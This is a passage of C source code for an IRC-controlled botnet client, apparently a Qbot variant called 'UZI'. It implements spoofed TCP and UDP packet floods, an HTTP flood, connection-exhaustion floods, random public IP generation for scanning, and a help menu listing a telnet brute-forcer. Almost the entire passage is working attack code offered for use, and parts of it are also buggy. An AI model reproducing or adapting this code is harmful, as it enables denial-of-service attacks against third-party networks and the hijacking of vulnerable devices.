                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}

int szprintf(unsigned char *out, const unsigned char *format, ...) {
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}

in_addr_t getRandomPublicIP() { // IP Block, Written by ZH 
        static uint8_t ipState[4] = {0};
        ipState[0] = rand() % 224;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
        while(
                (ipState[0] == 0) ||
                (ipState[0] == 10) ||
                (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
                (ipState[0] == 127) ||
                (ipState[0] == 169 && ipState[1] == 254) ||
                (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
                (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
                (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
                (ipState[0] == 192 && ipState[1] == 168) ||
                (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
                (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
                (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
                (ipState[0] >= 224)
        )
        {
                ipState[0] = rand() % 224;
                ipState[1] = rand() % 255;
                ipState[2] = rand() % 255;
                ipState[3] = rand() % 255;
        }
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}
void sendTCP(int sock, char *sender, int argc, char **argv)
{
    if (mfork(sender) != 0) return;
    if (argc < 7) {
       Send(sock,"PRIVMSG %s :7[QTCP] <target> <port> <secs> <netmask> <flags> <packetsize> <time poll interval> \n",chan);
       exit(1);
    }
	if (atoi(argv[3]) > maxtime)
	{
		Send(sock,"PRIVMSG %s :7[TCP] - Invalid time, Max boot time is [%d]!\n",chan, maxtime);
		exit(1);
	}
	if (atoi(argv[6]) > maxSTDpacketsize)
	{
		Send(sock,"PRIVMSG %s :7[TCP] - Invalid time, Max packetsize is [%d]!\n",chan, maxSTDpacketsize);
		exit(1);
	}
   
    char *target = argv[1], *flags = argv[5];
    int port = atoi(argv[2]), timeEnd = atoi(argv[3]), spoofit = atoi(argv[4]), packetsize = atoi(argv[6]), pollinterval = atoi(argv[7]);

    register unsigned int pollRegister;
    pollRegister = pollinterval;

    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd)
    {
        Send(sock,"PRIVMSG %s :7Failed opening raw socket.\n",chan);
        return;
    }

    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
    {
        Send(sock,"PRIVMSG %s :7Failed setting raw headers mode.\n",chan);
        return;
    }

    in_addr_t netmask;

    if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;

    if(!strcmp(flags, "all"))
    {
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->fin = 1;
        tcph->ack = 1;
        tcph->psh = 1;
    } else {
        unsigned char *pch = strtok(flags, ",");
        while(pch)
        {
            if(!strcmp(pch, "syn"))
            {
                tcph->syn = 1;
            } else if(!strcmp(pch,  "rst"))
            {
                tcph->rst = 1;
            } else if(!strcmp(pch,  "fin"))
            {
                tcph->fin = 1;
            } else if(!strcmp(pch,  "ack"))
            {
                tcph->ack = 1;
            } else if(!strcmp(pch,  "psh"))
            {
                tcph->psh = 1;
            } else {
                Send(sock, "PRIVMSG %s :7Invalid flag [%s]\n", chan, pch);
            }
            pch = strtok(NULL, ",");
            }
    }

    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);

    iph->check = csum ((unsigned short *) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;

    Send(sock,"PRIVMSG %s :7[TCP] packeting [%s].\n",chan,argv[1]);

    while(1)
    {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        iph->saddr = htonl( getRandomIP(netmask) );
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        if(i == pollRegister)
        {
            if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
    }
    Send(sock,"PRIVMSG %s :7[TCP] flood against [%s] finished.\n",chan,argv[1]);
}
int socket_connect(char *host, unsigned short int port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}

void SendHTTP(char *method, char *host, unsigned short int port, char *path, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1];
    for (i = 0; i < power; i++) {
        if (fork()) {
            while (end > time(NULL)) {
                sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, host, UserAgents[(rand() % 170)]);
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            exit(0);
        }
    }
}

void *HTTP(int sock, char *sender, int argc, char **argv) {
    
    // !* HTTP METHOD TARGET PORT PATH TIME POWER
    // !* HTTP GET hackforums.net 80 / 10 100
    if (mfork(sender) != 0) return;
    if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) {
        Send(sock, "NOTICE %s :7[HTTPFLOOD] <method> <target> <port> <path> <time> <power> ~ SMALL HTTPFLOOD WRITTEN BY ZH.\n", sender);
        return;
    }
    SendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
    exit(0);
    
}
void rawUDP(int sock, char *sender, int argc, char **argv) {
	int flag=1,fd,i;
	unsigned long secs;
	char *buf=(char*)malloc(65500);
 	struct hostent *hp;
	struct sockaddr_in in;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
	if (argc < 2) {
					
                exit(1);
        }
		if (atoi(argv[2]) > maxtime)
		{
			Send(sock,"PRIVMSG %s :7[RAWUDP] - Invalid time, Max boot time is %d!\n",chan, maxtime);
			exit(1);
		}
        secs=atol(argv[2]);
	memset((void*)&in,0,sizeof(struct sockaddr_in));
	in.sin_addr.s_addr=host2ip(sender,argv[1]);
	in.sin_family = AF_INET;
        Send(sock,"PRIVMSG %s :7Packeting %s With RAWUDP.\n",chan,argv[1]);
	while(1) {
		in.sin_port = rand();
		if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
		else {
			flag=1;
			ioctl(fd,FIONBIO,&flag);
			sendto(fd,buf,65500,0,(struct sockaddr*)&in,sizeof(in));
			close(fd);
		}
                if (i >= 50) {
                        if (time(NULL) >= start+secs)
						{
							break;
						}
                        i=0;
                }
                i++;
	}
        close(fd);
	exit(0);
}
void move(int sock, char *sender, int argc, char **argv) {
        if (argc < 1) {
                Send(sock,"PRIVMSG %s :7POINT <server>\n",chan);
                exit(1);
        }
	server=strdup(argv[1]);
	changeservers=1;
	close(sock);
}
void help(int sock, char *sender, int argc, char **argv) {
        if (mfork(sender) != 0) return;
        Send(sock,"PRIVMSG %s :7[UZI] - UZI IRC BOT HELP LIST ~WRITTEN BY ZH\n",chan);
        Send(sock,"PRIVMSG %s :7[UZI] - QUDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)> ~QUDP QBOT ATTACK\n",chan); sleep(0.2);
		Send(sock,"PRIVMSG %s :7[UZI] - RUDP <target> <secs> ~RAW UDP ATTACK \n",chan); sleep(0.2);
		Send(sock,"PRIVMSG %s :7[UZI] - QJUNK <target> <port> <secs> ~QJUNK QBOT ATTACK \n",chan); sleep(0.2);
		Send(sock,"PRIVMSG %s :7[UZI] - QHOLD <target> <port> <secs> ~QHOLD QBOT ATTACK \n",chan); sleep(0.2);
        Send(sock,"PRIVMSG %s :7[UZI] - QTCP <target> <port> <secs> <netmask> <flags> <packetsize> <time poll interval> ~QTCP QBOT ATTACK\n",chan); sleep(0.2);
        Send(sock,"PRIVMSG %s :7[UZI] - TSTD <target> <port> <secs> <packet size(1-%d)> <string(RANDOM for makestring)> <threads (1-%d)> ~THREADED STD ATTACK WRITTEN BY ZH\n\n",chan, maxSTDpacketsize, maxthreads); sleep(0.2);
		Send(sock,"PRIVMSG %s :7[UZI] - STD <target> <port> <secs> <packet size (1-%d)> <string(RANDOM for makestring)> ~STD ATTACK\n",chan, maxSTDpacketsize); sleep(0.2);
		Send(sock,"PRIVMSG %s :7[UZI] - HTTPFLOOD <method> <target> <port> <path> <time> <power> ~SMALL HTTPFLOOD WRITTEN BY ZH.\n",chan); sleep(0.2);
		Send(sock,"PRIVMSG %s :7[UZI] - UZIBRUTE <ON/OFF> ~EXTREME TELNET BRUTER WRITTEN BY ZH\n",chan); sleep(0.2);
        Send(sock,"PRIVMSG %s :7[UZI] - KILLALL\n",chan); sleep(0.2);
        Send(sock,"PRIVMSG %s :7[UZI] - HELP\n",chan);
        exit(0);
}
void regstd(int sock, char *sender, int argc, char **argv)
{
	if (mfork(sender) != 0) return;
    if (argc < 5) {
	
        Send(sock,"PRIVMSG %s :7[STD] <target> <port> <secs> <packet size(1-%d)> <string(RANDOM for makestring)>\n",chan, maxSTDpacketsize);
        exit(1);
		
    }
	if (atoi(argv[3]) > maxtime)
	{
		Send(sock,"PRIVMSG %s :7[STD] - Invalid time, Max boot time is %d!\n",chan, maxtime);
		exit(1);
	}
	if (atoi(argv[4]) > maxSTDpacketsize)
	{
		Send(sock,"PRIVMSG %s :7[STD] - Invalid time, Max packetsize is %d!\n",chan, maxSTDpacketsize);
		exit(1);
	}
	else {
		setpacketsize = atoi(argv[4]);
	}
    unsigned long secs;

    int iSTD_Sock;

    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);

    time_t start = time(NULL);
    secs = atol(argv[3]);
    if (mfork(sender) != 0) return;
	if(argv[5] = "RANDOM")
	{
		char *chokemedaddy = makestring();
		strng2 = chokemedaddy;
	}
	else
	{
		char *lolomgursobig = argv[5];
		strng2 = lolomgursobig;
	}
    Send(sock,"PRIVMSG %s :7[STD]Hitting %s!\n",chan, argv[1]);
	Send(sock,"PRIVMSG %s :7[STD]Packet Size: %d\n",chan, setpacketsize);
	Send(sock,"PRIVMSG %s :7[STD]String: %s\n",chan, strng2);

    struct sockaddr_in sin;

    struct hostent *hp;

    hp = gethostbyname(argv[1]);

    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = atol(argv[2]);

    unsigned int a = 0;

    while(1){
        if (a >= 50) 
        {
            send(iSTD_Sock, strng2, argv[4], 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs) 
            {
                Send(sock, "PRIVMSG %s :7[STD]Done hitting %s!\n", chan, argv[1]);
                close(iSTD_Sock);
                exit(0);
            }
            a = 0;
        }
        a++;
    }
	

}

void *std_worker(void *args){
	struct thread_args *t_args = (struct thread_args *)args;
	connect(t_args->iSTD_Sock,(struct sockaddr *) t_args->sin, sizeof(struct sockaddr));
	unsigned int i = 0;
	while (1){
		send(t_args->iSTD_Sock, strng, setpacketsize, 0);
		//usleep(3);
	}
}

void threadstd(int sock, char *sender, int argc, char **argv) {
    if (mfork(sender) != 0) return;
    if (argc < 6) {
            Send(sock,"PRIVMSG %s :7[THREADSTD] <target> <port> <secs> <packet size(1-%d)> <string(RANDOM for makestring)> <threads (1-%d)>\n",chan, maxSTDpacketsize, maxthreads);
            exit(1);
    }
	if (atoi(argv[3]) > maxtime)
	{
		Send(sock,"PRIVMSG %s :7[THREADSTD] - Invalid time, Max boot time is %d!\n",chan, maxtime);
		exit(1);
	}
	if (atoi(argv[4]) > maxSTDpacketsize)
	{
		Send(sock,"PRIVMSG %s :7[THREADSTD] - Invalid packetsize, Max packetsize is %d!\n",chan, maxSTDpacketsize);
		exit(1);
	}
	else {
		setpacketsize = atoi(argv[4]);
	}
	if (atoi(argv[6]) > maxthreads)
	{
		Send(sock,"PRIVMSG %s :7[THREADSTD] - Invalid threads, Max amount of threads allowed is %d!\n",chan, maxthreads);
		exit(1);
	}
	else {
		threadamount = atoi(argv[6]);
	}

    unsigned long secs;

    int iSTD_Sock;

    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);

    time_t start = time(NULL);
    secs = atol(argv[3]);
    if (mfork(sender) != 0) return;
	if(argv[5] = "RANDOM") 
	{
		char *spankmedaddy = makestring();
		strng = spankmedaddy;
	}
	else
	{
		char *wooowdaddy = argv[5];
		strng = wooowdaddy;
	}
    Send(sock,"PRIVMSG %s :7[THREADSTD] Railing %s!\n",chan,argv[1]);
	Send(sock,"PRIVMSG %s :7[THREADSTD] Packet Size: %d\n",chan, setpacketsize);
	Send(sock,"PRIVMSG %s :7[THREADSTD] String: %s\n",chan, strng);
	Send(sock,"PRIVMSG %s :7[THREADSTD] Threads: %d\n",chan, threadamount);

    struct sockaddr_in sin;

    struct hostent *hp;

    hp = gethostbyname(argv[1]);

    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = atol(argv[2]);

    unsigned int i;
    pthread_t thread_arr[atoi(argv[6])];
    struct thread_args t_args;
    t_args.iSTD_Sock = iSTD_Sock;
    t_args.sin = &sin;
    for (i = 0; i < atoi(argv[6]); i++){
	pthread_create(&thread_arr[i], NULL, std_worker, &t_args);
    }
    while(1){
	if (time(NULL) >= start + secs){
		Send(sock, "PRIVMSG %s :7Packeted[%s]\n", chan, argv[1]);
		close(iSTD_Sock);
		exit(0);
	}
    }
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        register unsigned int pollRegister;
        pollRegister = pollinterval;

		int sock;
		char *sender;
		
        if(spoofit == 32)
        {
                int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if(!sockfd)
                {
						Send(sock,"PRIVMSG %s :7Failed opening raw socket.\n",chan);
                        return;
                }

                unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
                if(buf == NULL) return;
                memset(buf, 0, packetsize + 1);
                makeRandomStr(buf, packetsize);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
				register unsigned int ii = 0;
				int argc;
				char **argv;
				Send(sock,"PRIVMSG %s :7[QUDP] Flooding [%s:%s] (%s Secs)\n",chan, argv[1], atoi(argv[2]), atoi(argv[3]));
                while(1)
                {
                        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        if(i == pollRegister)
                        {
                                if(port == 0) dest_addr.sin_port = rand_cmwc();
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                        if(ii == sleepcheck)
                        {
                            usleep(sleeptime*1000);
							ii = 0;
                            continue;
                        }
                        ii++;
                }
        } else {
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd)
                {
						Send(sock,"PRIVMSG %s :7Failed opening raw socket.\n",chan);
                        return;
                }

                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
                {
						Send(sock,"PRIVMSG %s :7Failed setting raw headers mode.\n",chan);
                        return;
                }

                int counter = 50;
                while(counter--)
                {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }

                in_addr_t netmask;

                if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
                else netmask = ( ~((1 << (32 - spoofit)) - 1) );

                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;

                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
				register unsigned int ii = 0;
                while(1)
                {
                    sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                    udph->source = rand_cmwc();
                    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                    iph->id = rand_cmwc();
                    iph->saddr = htonl( getRandomIP(netmask) );
                    iph->check = csum ((unsigned short *) packet, iph->tot_len);

                    if(i == pollRegister)
                    {
                            if(time(NULL) > end) break;
                            i = 0;
                            continue;
                    }
                    i++;
					
					if(ii == sleepcheck)
                    {
                        usleep(sleeptime*1000);
						ii = 0;
                        continue;
                    }
                    ii++;
                }
				int argc;
				char **argv;
				Send(sock,"PRIVMSG %s :7[QUDP] Flood On [%s:%s] Finished!\n",chan, argv[1], atoi(argv[2]));
        }
}
void sendJUNK(unsigned char *ip, int port, int end_time)
{

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if(getHost(ip, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t
    {
        int fd;
        uint8_t state;
    } fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    unsigned char *watwat = malloc(8192);
    memset(watwat, 0, 8192);
    int packetLen = 1024;
    
    int end = time(NULL) + end_time;
    while(end > time(NULL))
    {
        for(i = 0; i < max; i++)
        {
            switch(fds[i].state)
            {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd, &myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                    if(res == 1)
                    {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                        if(valopt)
                        {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if(res == -1)
                    {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
               
                    packetLen = realrand(32, 8192);
                    makeRandomShit(watwat, packetLen);
                    if(send(fds[i].fd, watwat, packetLen, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
                    {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}

char *junk(int sock, char *sender, int argc, char **argv) {
    if(argc < 3 || atoi(argv[3]) < 0) {
        Send(sock, "PRIVMSG %s :7[JUNK] <ip> <port> <time>\n", chan);
        return;
    }
    if(mfork(sender) != 0) return;
    Send(sock, "PRIVMSG %s :7[JUNK] flooding %s:%s\n", chan, argv[1], argv[2]);
    sendJUNK(argv[1], atoi(argv[2]), atoi(argv[3]));
}

void sendHOLD(unsigned char *ip, int port, int end_time)
{

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if(getHost(ip, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t
    {
        int fd;
        uint8_t state;
    } fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    int end = time(NULL) + end_time;
    while(end > time(NULL))
    {
        for(i = 0; i < max; i++)
        {
            switch(fds[i].state)
            {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd, &myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                    if(res == 1)
                    {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                        if(valopt)
                        {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if(res == -1)
                    {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd, &myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
                    if(res != 0)
                    {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}

char *hold(int sock, char *sender, int argc, char **argv) {
    if(argc < 3 || atoi(argv[3]) < 0) {
        Send(sock, "PRIVMSG %s :7[HOLD] <ip> <port> <time>\n", chan);
        return;
    }
    if(mfork(sender) != 0) return;
    Send(sock, "PRIVMSG %s :7[HOLD] flooding [%s:%s]\n", chan, argv[1], argv[2]);
    sendHOLD(argv[1], atoi(argv[2]), atoi(argv[3]));
}
void udpbiatch(int sock, char *sender, int argc, char **argv)
{
	if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || (argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > maxSTDpacketsize || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
	{
			Send(sock,"PRIVMSG %s :7[QUDP] <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\n",chan);
			return;
	}
	if (atoi(argv[3]) > maxtime)
	{
		Send(sock,"PRIVMSG %s :7[QUDP] - Invalid time, Max boot time is %d!\n",chan, maxtime);
		exit(1);
	}
	if (atoi(argv[5]) > maxSTDpacketsize)
	{
		Send(sock,"PRIVMSG %s :7[QUDP] - Invalid time, Max packetsize is %d!\n",chan, maxSTDpacketsize);
		exit(1);
	}
	unsigned char *ip = argv[1];
	int port = atoi(argv[2]);
	int time = atoi(argv[3]);
	int spoofed = atoi(argv[4]);
	int packetsize = atoi(argv[5]);
	int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
	int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
	int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
	
	if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendUDP(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (!listFork()){
							sendUDP(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
							_exit(0);	
						}
                }
				return;
}

void killall(int sock, char *sender, int argc, char **argv) {
        unsigned long i;
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        if (sender) Send(sock,"PRIVMSG %s :4[KILL] PID DROPPED - [%d]\n",chan,pids[i]);
						kill(pids[i],9);
                }
        }
}
void killd(int sock, char *sender, int argc, char **argv) {
    char buf[1024]={0};
    if (disabled == 1) return;
    sprintf(buf,"kill -9 %d;kill -9 0",actualparent);
    system(buf);
    exit(0);
}
void train_ps(int sock, char *sender, int argc, char **argv) {
	int match = 0;
	unsigned int i;
	for (i = 0; i < NUM_ADMINS; i++){
		if (strcasecmp(admins[i], sender) == 0){
			match = 1;
		}
	}
	if(match){
		maxSTDpacketsize = atoi(argv[1]);
		Send(sock, "PRIVMSG %s :7PACKETSIZE: Max Packetsize changed to -> %d\n", chan, maxSTDpacketsize);
	} else {
		Send(sock, "PRIVMSG %s :7PACKETSIZE: You must have admin status to change the Max packetsize!n", chan);
	}
}

void max_bt(int sock, char *sender, int argc, char **argv) {
	int match = 0;
	unsigned int i;
	for (i = 0; i < NUM_ADMINS; i++){
		if (strcasecmp(admins[i], sender) == 0){
			match = 1;
		}
	}
	if(match){
		maxtime = atoi(argv[1]);
		Send(sock, "PRIVMSG %s :7BOOT TIME: Max boot time changed to -> %d\n", chan, maxtime);
	} else {
		Send(sock, "PRIVMSG %s :7BOOT TIME: You must have admin status to change the Max boot time!\n", chan);
	}
}

void max_threads(int sock, char *sender, int argc, char **argv) {
	int match = 0;
	unsigned int i;
	for (i = 0; i < NUM_ADMINS; i++){
		if (strcasecmp(admins[i], sender) == 0){
			match = 1;
		}
	}
	if(match){
		maxthreads = atoi(argv[1]);
		Send(sock, "PRIVMSG %s :7MAX ATTACK THREADS: Max threads changed to -> %d\n", chan, maxthreads);
	} else {
		Send(sock, "PRIVMSG %s :7MAX ATTACK THREADS: You must have admin status to change the Max threads!\n", chan);
	}
}
int negotiate(int sock, unsigned char *buf, int len) {
        unsigned char c;
        switch (buf[1]) {
        case CMD_IAC: return 0;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
                c = CMD_IAC;
                send(sock, &c, 1, MSG_NOSIGNAL);
                if (CMD_WONT == buf[1]) c = CMD_DONT;
                else if (CMD_DONT == buf[1]) c = CMD_WONT;
                else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
                else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
                send(sock, &c, 1, MSG_NOSIGNAL);
                send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
                break;
        default:
                break;
        }

        return 0;
}

int contains_string(char* buffer, char** strings) {
        int num_strings = 0, i = 0;
        for(num_strings = 0; strings[++num_strings] != 0; );
        for(i = 0; i < num_strings; i++) {
                if(strcasestr(buffer, strings[i])) {
                        return 1;
                }
        }
